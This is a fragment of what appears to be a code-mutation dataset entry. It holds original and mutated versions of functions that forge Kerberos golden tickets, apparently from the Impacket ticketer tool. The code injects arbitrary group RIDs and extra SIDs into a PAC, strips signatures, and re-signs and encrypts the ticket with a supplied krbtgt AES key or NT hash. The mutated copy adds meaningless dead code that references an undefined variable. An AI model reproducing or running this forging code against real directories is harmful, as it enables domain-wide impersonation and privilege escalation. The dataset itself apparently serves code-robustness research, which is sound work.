encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])\n        elif encTicketPart['key']['keytype'] == EncryptionTypes.aes256_cts_hmac_sha1_96.value:\n            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(32)])\n        else:\n            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])\n        encTicketPart['crealm'] = self.__domain.upper()\n        encTicketPart['cname'] = noValue\n        encTicketPart['cname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value\n        encTicketPart['cname']['name-string'] = noValue\n        encTicketPart['cname']['name-string'][0] = self.__target\n        encTicketPart['transited'] = noValue\n        encTicketPart['transited']['tr-type'] = 0\n        encTicketPart['transited']['contents'] = ''\n        encTicketPart['authtime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())\n        encTicketPart['starttime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())\n        encTicketPart['endtime'] = KerberosTime.to_asn1(ticketDuration)\n        encTicketPart['renew-till'] = KerberosTime.to_asn1(ticketDuration)\n        encTicketPart['authorization-data'] = noValue\n        encTicketPart['authorization-data'][0] = noValue\n        encTicketPart['authorization-data'][0]['ad-type'] = AuthorizationDataType.AD_IF_RELEVANT.value\n        encTicketPart['authorization-data'][0]['ad-data'] = noValue\n        if PAC_LOGON_INFO in pacInfos:\n            data = pacInfos[PAC_LOGON_INFO]\n            validationInfo = VALIDATION_INFO()\n            validationInfo.fromString(pacInfos[PAC_LOGON_INFO])\n            lenVal = len(validationInfo.getData())\n            validationInfo.fromStringReferents(data, lenVal)\n            aTime = timegm(strptime(str(encTicketPart['authtime']), '%Y%m%d%H%M%SZ'))\n            unixTime = self.getFileTime(aTime)\n            kerbdata = KERB_VALIDATION_INFO()\n            kerbdata['LogonTime']['dwLowDateTime'] = unixTime & 4294967295\n            kerbdata['LogonTime']['dwHighDateTime'] = unixTime >> 32\n            validationInfo['Data']['LogonDomainName'] = self.__domain.upper()\n            validationInfo['Data']['EffectiveName'] = self.__target\n            groups = self.__options.groups.split(',')\n            validationInfo['Data']['GroupIds'] = list()\n            validationInfo['Data']['GroupCount'] = len(groups)\n            for group in groups:\n                groupMembership = GROUP_MEMBERSHIP()\n                groupId = NDRULONG()\n                groupId['Data'] = int(group)\n                groupMembership['RelativeId'] = groupId\n                groupMembership['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED\n                validationInfo['Data']['GroupIds'].append(groupMembership)\n            if self.__options.extra_sid is not None:\n                extrasids = self.__options.extra_sid.split(',')\n                if validationInfo['Data']['SidCount'] == 0:\n                    validationInfo['Data']['UserFlags'] |= 32\n                    validationInfo['Data']['ExtraSids'] = PKERB_SID_AND_ATTRIBUTES_ARRAY()\n                for extrasid in extrasids:\n                    validationInfo['Data']['SidCount'] += 1\n                    sidRecord = KERB_SID_AND_ATTRIBUTES()\n                    sid = RPC_SID()\n                    sid.fromCanonical(extrasid)\n                    sidRecord['Sid'] = sid\n                    sidRecord['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED\n                    validationInfo['Data']['ExtraSids'].append(sidRecord)\n            else:\n                validationInfo['Data']['ExtraSids'] = NULL\n            validationInfoBlob = validationInfo.getData() + validationInfo.getDataReferents()\n            pacInfos[PAC_LOGON_INFO] = validationInfoBlob\n            if logging.getLogger().level == logging.DEBUG:\n                logging.debug('VALIDATION_INFO after making it gold')\n                validationInfo.dump()\n                print('\\n')\n        else:\n            raise Exception('PAC_LOGON_INFO not found! Aborting')\n        logging.info('\\tPAC_LOGON_INFO')\n        if PAC_SERVER_CHECKSUM in pacInfos:\n            serverChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_SERVER_CHECKSUM])\n            if serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:\n                serverChecksum['Signature'] = '\\x00' * 12\n            elif serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:\n                serverChecksum['Signature'] = '\\x00' * 12\n            else:\n                serverChecksum['Signature'] = '\\x00' * 16\n            pacInfos[PAC_SERVER_CHECKSUM] = serverChecksum.getData()\n        else:\n            raise Exception('PAC_SERVER_CHECKSUM not found! Aborting')\n        if PAC_PRIVSVR_CHECKSUM in pacInfos:\n            privSvrChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_PRIVSVR_CHECKSUM])\n            privSvrChecksum['Signature'] = '\\x00' * 12\n            if privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:\n                privSvrChecksum['Signature'] = '\\x00' * 12\n            elif privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:\n                privSvrChecksum['Signature'] = '\\x00' * 12\n            else:\n                privSvrChecksum['Signature'] = '\\x00' * 16\n            pacInfos[PAC_PRIVSVR_CHECKSUM] = privSvrChecksum.getData()\n        else:\n            raise Exception('PAC_PRIVSVR_CHECKSUM not found! Aborting')\n        if PAC_CLIENT_INFO_TYPE in pacInfos:\n            pacClientInfo = PAC_CLIENT_INFO(pacInfos[PAC_CLIENT_INFO_TYPE])\n            pacClientInfo['ClientId'] = unixTime\n            pacInfos[PAC_CLIENT_INFO_TYPE] = pacClientInfo.getData()\n        else:\n            raise Exception('PAC_CLIENT_INFO_TYPE not found! Aborting')\n        logging.info('\\tPAC_CLIENT_INFO_TYPE')\n        logging.info('\\tEncTicketPart')\n    if self.__domain == self.__server:\n        encRepPart = EncASRepPart()\n    else:\n        encRepPart = EncTGSRepPart()\n    encRepPart['key'] = noValue\n    encRepPart['key']['keytype'] = encTicketPart['key']['keytype']\n    encRepPart['key']['keyvalue'] = encTicketPart['key']['keyvalue']\n    encRepPart['last-req'] = noValue\n    encRepPart['last-req'][0] = noValue\n    encRepPart['last-req'][0]['lr-type'] = 0\n    encRepPart['last-req'][0]['lr-value'] = KerberosTime.to_asn1(datetime.datetime.utcnow())\n    encRepPart['nonce'] = 123456789\n    encRepPart['key-expiration'] = KerberosTime.to_asn1(ticketDuration)\n    flags = []\n    for i in encTicketPart['flags']:\n        flags.append(i)\n    encRepPart['flags'] = flags\n    encRepPart['authtime'] = str(encTicketPart['authtime'])\n    encRepPart['endtime'] = str(encTicketPart['endtime'])\n    encRepPart['starttime'] = str(encTicketPart['starttime'])\n    encRepPart['renew-till'] = str(encTicketPart['renew-till'])\n    encRepPart['srealm'] = self.__domain.upper()\n    encRepPart['sname'] = noValue\n    encRepPart['sname']['name-string'] = noValue\n    encRepPart['sname']['name-string'][0] = self.__service\n    if self.__domain == self.__server:\n        encRepPart['sname']['name-type'] = PrincipalNameType.NT_SRV_INST.value\n        encRepPart['sname']['name-string'][1] = self.__domain.upper()\n        logging.info('\\tEncAsRepPart')\n    else:\n        encRepPart['sname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value\n        encRepPart['sname']['name-string'][1] = self.__server\n        logging.info('\\tEncTGSRepPart')\n    return (encRepPart, encTicketPart, pacInfos)",
            "def customizeTicket(self, kdcRep, pacInfos):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    logging.info('Customizing ticket for %s/%s' % (self.__domain, self.__target))\n    ticketDuration = datetime.datetime.utcnow() + datetime.timedelta(hours=int(self.__options.duration))\n    if self.__options.impersonate:\n        logging.info(\"\\tRequesting S4U2self+U2U to obtain %s's PAC\" % self.__options.impersonate)\n        (tgs, cipher, oldSessionKey, sessionKey) = self.getKerberosS4U2SelfU2U()\n        logging.info('\\tDecrypting ticket & extracting PAC')\n        decodedTicket = decoder.decode(tgs, asn1Spec=TGS_REP())[0]\n        cipherText = decodedTicket['ticket']['enc-part']['cipher']\n        newCipher = _enctype_table[int(decodedTicket['ticket']['enc-part']['etype'])]\n        plainText = newCipher.decrypt(self.__tgt_session_key, 2, cipherText)\n        encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]\n        adIfRelevant = decoder.decode(encTicketPart['authorization-data'][0]['ad-data'], asn1Spec=AD_IF_RELEVANT())[0]\n        pacType = pac.PACTYPE(adIfRelevant[0]['ad-data'].asOctets())\n        pacInfos = dict()\n        buff = pacType['Buffers']\n        AttributesInfoPacInS4UU2UPAC = False\n        RequestorInfoPacInS4UU2UPAC = False\n        logging.info('\\tClearing signatures')\n        for bufferN in range(pacType['cBuffers']):\n            infoBuffer = pac.PAC_INFO_BUFFER(buff)\n            data = pacType['Buffers'][infoBuffer['Offset'] - 8:][:infoBuffer['cbBufferSize']]\n            buff = buff[len(infoBuffer):]\n            if infoBuffer['ulType'] in [PAC_SERVER_CHECKSUM, PAC_PRIVSVR_CHECKSUM]:\n                checksum = PAC_SIGNATURE_DATA(data)\n                if checksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:\n                    checksum['Signature'] = '\\x00' * 12\n                elif checksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:\n                    checksum['Signature'] = '\\x00' * 12\n                else:\n                    checksum['Signature'] = '\\x00' * 16\n                pacInfos[infoBuffer['ulType']] = checksum.getData()\n            elif infoBuffer['ulType'] == PAC_ATTRIBUTES_INFO:\n                AttributesInfoPacInS4UU2UPAC = True\n                pacInfos[infoBuffer['ulType']] = data\n            elif infoBuffer['ulType'] == PAC_REQUESTOR_INFO:\n                RequestorInfoPacInS4UU2UPAC = True\n                pacInfos[infoBuffer['ulType']] = data\n            else:\n                pacInfos[infoBuffer['ulType']] = data\n        if self.__options.old_pac is False and (not AttributesInfoPacInS4UU2UPAC):\n            self.createAttributesInfoPac(pacInfos)\n        if self.__options.old_pac is False and (not RequestorInfoPacInS4UU2UPAC):\n            if self.__options.user_id == '500':\n                logging.warning(\"User ID is 500, which is Impacket's default. If you specified -user-id, you can ignore this message. If you didn't, and you get a KDC_ERR_TGT_REVOKED error when using the ticket, you will need to specify the -user-id with the RID of the target user to impersonate\")\n            self.createRequestorInfoPac(pacInfos)\n        logging.info('\\tAdding necessary ticket flags')\n        originalFlags = [i for (i, x) in enumerate(list(encTicketPart['flags'].asBinary())) if x == '1']\n        flags = originalFlags\n        newFlags = [TicketFlags.forwardable.value, TicketFlags.proxiable.value, TicketFlags.renewable.value, TicketFlags.pre_authent.value]\n        if self.__domain == self.__server:\n            newFlags.append(TicketFlags.initial.value)\n        for newFlag in newFlags:\n            if newFlag not in originalFlags:\n                flags.append(newFlag)\n        encTicketPart['flags'] = encodeFlags(flags)\n        logging.info('\\tChanging keytype')\n        encTicketPart['key']['keytype'] = kdcRep['ticket']['enc-part']['etype']\n        if encTicketPart['key']['keytype'] == EncryptionTypes.aes128_cts_hmac_sha1_96.value:\n            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])\n        elif encTicketPart['key']['keytype'] == EncryptionTypes.aes256_cts_hmac_sha1_96.value:\n            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(32)])\n        else:\n            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])\n    else:\n        encTicketPart = EncTicketPart()\n        flags = list()\n        flags.append(TicketFlags.forwardable.value)\n        flags.append(TicketFlags.proxiable.value)\n        flags.append(TicketFlags.renewable.value)\n        if self.__domain == self.__server:\n            flags.append(TicketFlags.initial.value)\n        flags.append(TicketFlags.pre_authent.value)\n        encTicketPart['flags'] = encodeFlags(flags)\n        encTicketPart['key'] = noValue\n        encTicketPart['key']['keytype'] = kdcRep['ticket']['enc-part']['etype']\n        if encTicketPart['key']['keytype'] == EncryptionTypes.aes128_cts_hmac_sha1_96.value:\n            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])\n        elif encTicketPart['key']['keytype'] == EncryptionTypes.aes256_cts_hmac_sha1_96.value:\n            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(32)])\n        else:\n            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])\n        encTicketPart['crealm'] = self.__domain.upper()\n        encTicketPart['cname'] = noValue\n        encTicketPart['cname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value\n        encTicketPart['cname']['name-string'] = noValue\n        encTicketPart['cname']['name-string'][0] = self.__target\n        encTicketPart['transited'] = noValue\n        encTicketPart['transited']['tr-type'] = 0\n        encTicketPart['transited']['contents'] = ''\n        encTicketPart['authtime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())\n        encTicketPart['starttime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())\n        encTicketPart['endtime'] = KerberosTime.to_asn1(ticketDuration)\n        encTicketPart['renew-till'] = KerberosTime.to_asn1(ticketDuration)\n        encTicketPart['authorization-data'] = noValue\n        encTicketPart['authorization-data'][0] = noValue\n        encTicketPart['authorization-data'][0]['ad-type'] = AuthorizationDataType.AD_IF_RELEVANT.value\n        encTicketPart['authorization-data'][0]['ad-data'] = noValue\n        if PAC_LOGON_INFO in pacInfos:\n            data = pacInfos[PAC_LOGON_INFO]\n            validationInfo = VALIDATION_INFO()\n            validationInfo.fromString(pacInfos[PAC_LOGON_INFO])\n            lenVal = len(validationInfo.getData())\n            validationInfo.fromStringReferents(data, lenVal)\n            aTime = timegm(strptime(str(encTicketPart['authtime']), '%Y%m%d%H%M%SZ'))\n            unixTime = self.getFileTime(aTime)\n            kerbdata = KERB_VALIDATION_INFO()\n            kerbdata['LogonTime']['dwLowDateTime'] = unixTime & 4294967295\n            kerbdata['LogonTime']['dwHighDateTime'] = unixTime >> 32\n            validationInfo['Data']['LogonDomainName'] = self.__domain.upper()\n            validationInfo['Data']['EffectiveName'] = self.__target\n            groups = self.__options.groups.split(',')\n            validationInfo['Data']['GroupIds'] = list()\n            validationInfo['Data']['GroupCount'] = len(groups)\n            for group in groups:\n                groupMembership = GROUP_MEMBERSHIP()\n                groupId = NDRULONG()\n                groupId['Data'] = int(group)\n                groupMembership['RelativeId'] = groupId\n                groupMembership['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED\n                validationInfo['Data']['GroupIds'].append(groupMembership)\n            if self.__options.extra_sid is not None:\n                extrasids = self.__options.extra_sid.split(',')\n                if validationInfo['Data']['SidCount'] == 0:\n                    validationInfo['Data']['UserFlags'] |= 32\n                    validationInfo['Data']['ExtraSids'] = PKERB_SID_AND_ATTRIBUTES_ARRAY()\n                for extrasid in extrasids:\n                    validationInfo['Data']['SidCount'] += 1\n                    sidRecord = KERB_SID_AND_ATTRIBUTES()\n                    sid = RPC_SID()\n                    sid.fromCanonical(extrasid)\n                    sidRecord['Sid'] = sid\n                    sidRecord['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED\n                    validationInfo['Data']['ExtraSids'].append(sidRecord)\n            else:\n                validationInfo['Data']['ExtraSids'] = NULL\n            validationInfoBlob = validationInfo.getData() + validationInfo.getDataReferents()\n            pacInfos[PAC_LOGON_INFO] = validationInfoBlob\n            if logging.getLogger().level == logging.DEBUG:\n                logging.debug('VALIDATION_INFO after making it gold')\n                validationInfo.dump()\n                print('\\n')\n        else:\n            raise Exception('PAC_LOGON_INFO not found! Aborting')\n        logging.info('\\tPAC_LOGON_INFO')\n        if PAC_SERVER_CHECKSUM in pacInfos:\n            serverChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_SERVER_CHECKSUM])\n            if serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:\n                serverChecksum['Signature'] = '\\x00' * 12\n            elif serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:\n                serverChecksum['Signature'] = '\\x00' * 12\n            else:\n                serverChecksum['Signature'] = '\\x00' * 16\n            pacInfos[PAC_SERVER_CHECKSUM] = serverChecksum.getData()\n        else:\n            raise Exception('PAC_SERVER_CHECKSUM not found! Aborting')\n        if PAC_PRIVSVR_CHECKSUM in pacInfos:\n            privSvrChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_PRIVSVR_CHECKSUM])\n            privSvrChecksum['Signature'] = '\\x00' * 12\n            if privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:\n                privSvrChecksum['Signature'] = '\\x00' * 12\n            elif privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:\n                privSvrChecksum['Signature'] = '\\x00' * 12\n            else:\n                privSvrChecksum['Signature'] = '\\x00' * 16\n            pacInfos[PAC_PRIVSVR_CHECKSUM] = privSvrChecksum.getData()\n        else:\n            raise Exception('PAC_PRIVSVR_CHECKSUM not found! Aborting')\n        if PAC_CLIENT_INFO_TYPE in pacInfos:\n            pacClientInfo = PAC_CLIENT_INFO(pacInfos[PAC_CLIENT_INFO_TYPE])\n            pacClientInfo['ClientId'] = unixTime\n            pacInfos[PAC_CLIENT_INFO_TYPE] = pacClientInfo.getData()\n        else:\n            raise Exception('PAC_CLIENT_INFO_TYPE not found! Aborting')\n        logging.info('\\tPAC_CLIENT_INFO_TYPE')\n        logging.info('\\tEncTicketPart')\n    if self.__domain == self.__server:\n        encRepPart = EncASRepPart()\n    else:\n        encRepPart = EncTGSRepPart()\n    encRepPart['key'] = noValue\n    encRepPart['key']['keytype'] = encTicketPart['key']['keytype']\n    encRepPart['key']['keyvalue'] = encTicketPart['key']['keyvalue']\n    encRepPart['last-req'] = noValue\n    encRepPart['last-req'][0] = noValue\n    encRepPart['last-req'][0]['lr-type'] = 0\n    encRepPart['last-req'][0]['lr-value'] = KerberosTime.to_asn1(datetime.datetime.utcnow())\n    encRepPart['nonce'] = 123456789\n    encRepPart['key-expiration'] = KerberosTime.to_asn1(ticketDuration)\n    flags = []\n    for i in encTicketPart['flags']:\n        flags.append(i)\n    encRepPart['flags'] = flags\n    encRepPart['authtime'] = str(encTicketPart['authtime'])\n    encRepPart['endtime'] = str(encTicketPart['endtime'])\n    encRepPart['starttime'] = str(encTicketPart['starttime'])\n    encRepPart['renew-till'] = str(encTicketPart['renew-till'])\n    encRepPart['srealm'] = self.__domain.upper()\n    encRepPart['sname'] = noValue\n    encRepPart['sname']['name-string'] = noValue\n    encRepPart['sname']['name-string'][0] = self.__service\n    if self.__domain == self.__server:\n        encRepPart['sname']['name-type'] = PrincipalNameType.NT_SRV_INST.value\n        encRepPart['sname']['name-string'][1] = self.__domain.upper()\n        logging.info('\\tEncAsRepPart')\n    else:\n        encRepPart['sname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value\n        encRepPart['sname']['name-string'][1] = self.__server\n        logging.info('\\tEncTGSRepPart')\n    return (encRepPart, encTicketPart, pacInfos)"
        ]
    },
    {
        "func_name": "signEncryptTicket",
        "original": "def signEncryptTicket(self, kdcRep, encASorTGSRepPart, encTicketPart, pacInfos):\n    logging.info('Signing/Encrypting final ticket')\n    pac_count = 4\n    validationInfoBlob = pacInfos[PAC_LOGON_INFO]\n    validationInfoAlignment = b'\\x00' * self.getPadLength(len(validationInfoBlob))\n    pacClientInfoBlob = pacInfos[PAC_CLIENT_INFO_TYPE]\n    pacClientInfoAlignment = b'\\x00' * self.getPadLength(len(pacClientInfoBlob))\n    pacUpnDnsInfoBlob = None\n    pacUpnDnsInfoAlignment = None\n    if PAC_UPN_DNS_INFO in pacInfos:\n        pac_count += 1\n        pacUpnDnsInfoBlob = pacInfos[PAC_UPN_DNS_INFO]\n        pacUpnDnsInfoAlignment = b'\\x00' * self.getPadLength(len(pacUpnDnsInfoBlob))\n    pacAttributesInfoBlob = None\n    pacAttributesInfoAlignment = None\n    if PAC_ATTRIBUTES_INFO in pacInfos:\n        pac_count += 1\n        pacAttributesInfoBlob = pacInfos[PAC_ATTRIBUTES_INFO]\n        pacAttributesInfoAlignment = b'\\x00' * self.getPadLength(len(pacAttributesInfoBlob))\n    pacRequestorInfoBlob = None\n    pacRequestorInfoAlignment = None\n    if PAC_REQUESTOR_INFO in pacInfos:\n        pac_count += 1\n        pacRequestorInfoBlob = pacInfos[PAC_REQUESTOR_INFO]\n        pacRequestorInfoAlignment = b'\\x00' * self.getPadLength(len(pacRequestorInfoBlob))\n    serverChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_SERVER_CHECKSUM])\n    serverChecksumBlob = pacInfos[PAC_SERVER_CHECKSUM]\n    serverChecksumAlignment = b'\\x00' * self.getPadLength(len(serverChecksumBlob))\n    privSvrChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_PRIVSVR_CHECKSUM])\n    privSvrChecksumBlob = pacInfos[PAC_PRIVSVR_CHECKSUM]\n    privSvrChecksumAlignment = b'\\x00' * self.getPadLength(len(privSvrChecksumBlob))\n    offsetData = 8 + len(PAC_INFO_BUFFER().getData()) * pac_count\n    validationInfoIB = PAC_INFO_BUFFER()\n    validationInfoIB['ulType'] = PAC_LOGON_INFO\n    validationInfoIB['cbBufferSize'] = len(validationInfoBlob)\n    validationInfoIB['Offset'] = offsetData\n    offsetData = self.getBlockLength(offsetData + validationInfoIB['cbBufferSize'])\n    pacClientInfoIB = PAC_INFO_BUFFER()\n    pacClientInfoIB['ulType'] = PAC_CLIENT_INFO_TYPE\n    pacClientInfoIB['cbBufferSize'] = len(pacClientInfoBlob)\n    pacClientInfoIB['Offset'] = offsetData\n    offsetData = self.getBlockLength(offsetData + pacClientInfoIB['cbBufferSize'])\n    pacUpnDnsInfoIB = None\n    if pacUpnDnsInfoBlob is not None:\n        pacUpnDnsInfoIB = PAC_INFO_BUFFER()\n        pacUpnDnsInfoIB['ulType'] = PAC_UPN_DNS_INFO\n        pacUpnDnsInfoIB['cbBufferSize'] = len(pacUpnDnsInfoBlob)\n        pacUpnDnsInfoIB['Offset'] = offsetData\n        offsetData = self.getBlockLength(offsetData + pacUpnDnsInfoIB['cbBufferSize'])\n    pacAttributesInfoIB = None\n    if pacAttributesInfoBlob is not None:\n        pacAttributesInfoIB = PAC_INFO_BUFFER()\n        pacAttributesInfoIB['ulType'] = PAC_ATTRIBUTES_INFO\n        pacAttributesInfoIB['cbBufferSize'] = len(pacAttributesInfoBlob)\n        pacAttributesInfoIB['Offset'] = offsetData\n        offsetData = self.getBlockLength(offsetData + pacAttributesInfoIB['cbBufferSize'])\n    pacRequestorInfoIB = None\n    if pacRequestorInfoBlob is not None:\n        pacRequestorInfoIB = PAC_INFO_BUFFER()\n        pacRequestorInfoIB['ulType'] = PAC_REQUESTOR_INFO\n        pacRequestorInfoIB['cbBufferSize'] = len(pacRequestorInfoBlob)\n        pacRequestorInfoIB['Offset'] = offsetData\n        offsetData = self.getBlockLength(offsetData + pacRequestorInfoIB['cbBufferSize'])\n    serverChecksumIB = PAC_INFO_BUFFER()\n    serverChecksumIB['ulType'] = PAC_SERVER_CHECKSUM\n    serverChecksumIB['cbBufferSize'] = len(serverChecksumBlob)\n    serverChecksumIB['Offset'] = offsetData\n    offsetData = self.getBlockLength(offsetData + serverChecksumIB['cbBufferSize'])\n    privSvrChecksumIB = PAC_INFO_BUFFER()\n    privSvrChecksumIB['ulType'] = PAC_PRIVSVR_CHECKSUM\n    privSvrChecksumIB['cbBufferSize'] = len(privSvrChecksumBlob)\n    privSvrChecksumIB['Offset'] = offsetData\n    buffers = validationInfoIB.getData() + pacClientInfoIB.getData()\n    if pacUpnDnsInfoIB is not None:\n        buffers += pacUpnDnsInfoIB.getData()\n    if pacAttributesInfoIB is not None:\n        buffers += pacAttributesInfoIB.getData()\n    if pacRequestorInfoIB is not None:\n        buffers += pacRequestorInfoIB.getData()\n    buffers += serverChecksumIB.getData() + privSvrChecksumIB.getData() + validationInfoBlob + validationInfoAlignment + pacInfos[PAC_CLIENT_INFO_TYPE] + pacClientInfoAlignment\n    if pacUpnDnsInfoIB is not None:\n        buffers += pacUpnDnsInfoBlob + pacUpnDnsInfoAlignment\n    if pacAttributesInfoIB is not None:\n        buffers += pacAttributesInfoBlob + pacAttributesInfoAlignment\n    if pacRequestorInfoIB is not None:\n        buffers += pacRequestorInfoBlob + pacRequestorInfoAlignment\n    buffersTail = serverChecksumBlob + serverChecksumAlignment + privSvrChecksum.getData() + privSvrChecksumAlignment\n    pacType = PACTYPE()\n    pacType['cBuffers'] = pac_count\n    pacType['Version'] = 0\n    pacType['Buffers'] = buffers + buffersTail\n    blobToChecksum = pacType.getData()\n    checkSumFunctionServer = _checksum_table[serverChecksum['SignatureType']]\n    if serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:\n        keyServer = Key(Enctype.AES256, unhexlify(self.__options.aesKey))\n    elif serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:\n        keyServer = Key(Enctype.AES128, unhexlify(self.__options.aesKey))\n    elif serverChecksum['SignatureType'] == ChecksumTypes.hmac_md5.value:\n        keyServer = Key(Enctype.RC4, unhexlify(self.__options.nthash))\n    else:\n        raise Exception('Invalid Server checksum type 0x%x' % serverChecksum['SignatureType'])\n    checkSumFunctionPriv = _checksum_table[privSvrChecksum['SignatureType']]\n    if privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:\n        keyPriv = Key(Enctype.AES256, unhexlify(self.__options.aesKey))\n    elif privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:\n        keyPriv = Key(Enctype.AES128, unhexlify(self.__options.aesKey))\n    elif privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_md5.value:\n        keyPriv = Key(Enctype.RC4, unhexlify(self.__options.nthash))\n    else:\n        raise Exception('Invalid Priv checksum type 0x%x' % serverChecksum['SignatureType'])\n    serverChecksum['Signature'] = checkSumFunctionServer.checksum(keyServer, KERB_NON_KERB_CKSUM_SALT, blobToChecksum)\n    logging.info('\\tPAC_SERVER_CHECKSUM')\n    privSvrChecksum['Signature'] = checkSumFunctionPriv.checksum(keyPriv, KERB_NON_KERB_CKSUM_SALT, serverChecksum['Signature'])\n    logging.info('\\tPAC_PRIVSVR_CHECKSUM')\n    buffersTail = serverChecksum.getData() + serverChecksumAlignment + privSvrChecksum.getData() + privSvrChecksumAlignment\n    pacType['Buffers'] = buffers + buffersTail\n    authorizationData = AuthorizationData()\n    authorizationData[0] = noValue\n    authorizationData[0]['ad-type'] = AuthorizationDataType.AD_WIN2K_PAC.value\n    authorizationData[0]['ad-data'] = pacType.getData()\n    authorizationData = encoder.encode(authorizationData)\n    encTicketPart['authorization-data'][0]['ad-data'] = authorizationData\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('Customized EncTicketPart')\n        print(encTicketPart.prettyPrint())\n        print('\\n')\n    encodedEncTicketPart = encoder.encode(encTicketPart)\n    cipher = _enctype_table[kdcRep['ticket']['enc-part']['etype']]\n    if cipher.enctype == EncryptionTypes.aes256_cts_hmac_sha1_96.value:\n        key = Key(cipher.enctype, unhexlify(self.__options.aesKey))\n    elif cipher.enctype == EncryptionTypes.aes128_cts_hmac_sha1_96.value:\n        key = Key(cipher.enctype, unhexlify(self.__options.aesKey))\n    elif cipher.enctype == EncryptionTypes.rc4_hmac.value:\n        key = Key(cipher.enctype, unhexlify(self.__options.nthash))\n    else:\n        raise Exception('Unsupported enctype 0x%x' % cipher.enctype)\n    logging.info('\\tEncTicketPart')\n    cipherText = cipher.encrypt(key, 2, encodedEncTicketPart, None)\n    kdcRep['ticket']['enc-part']['cipher'] = cipherText\n    kdcRep['ticket']['enc-part']['kvno'] = 2\n    encodedEncASRepPart = encoder.encode(encASorTGSRepPart)\n    if self.__domain == self.__server:\n        sessionKey = Key(cipher.enctype, encASorTGSRepPart['key']['keyvalue'].asOctets())\n        logging.info('\\tEncASRepPart')\n        cipherText = cipher.encrypt(sessionKey, 3, encodedEncASRepPart, None)\n    else:\n        sessionKey = Key(cipher.enctype, encASorTGSRepPart['key']['keyvalue'].asOctets())\n        logging.info('\\tEncTGSRepPart')\n        cipherText = cipher.encrypt(sessionKey, 8, encodedEncASRepPart, None)\n    kdcRep['enc-part']['cipher'] = cipherText\n    kdcRep['enc-part']['etype'] = cipher.enctype\n    kdcRep['enc-part']['kvno'] = 1\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('Final Golden Ticket')\n        print(kdcRep.prettyPrint())\n        print('\\n')\n    return (encoder.encode(kdcRep), cipher, sessionKey)",
        "mutated": [
